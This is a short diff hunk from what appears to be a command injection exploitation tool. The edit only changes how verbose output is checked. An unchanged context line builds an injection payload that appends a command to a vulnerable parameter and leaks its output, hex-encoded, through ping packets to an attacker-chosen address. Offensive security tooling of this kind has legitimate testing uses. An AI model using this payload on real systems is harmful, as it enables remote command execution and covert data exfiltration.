@@ -91,7 +91,7 @@ def cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src):
   payload = ("; " + cmd + " | xxd -p -c 16 | while read line; do ping -p $line -c 1 -s16 -q " + ip_src + "; done")
   
   # Check if defined "--verbose" option.
-  if menu.options.verbose:
+  if settings.VERBOSITY_LEVEL >= 1:
     sys.stdout.write("\n" + settings.print_payload(payload))
 
   if http_request_method == "GET":
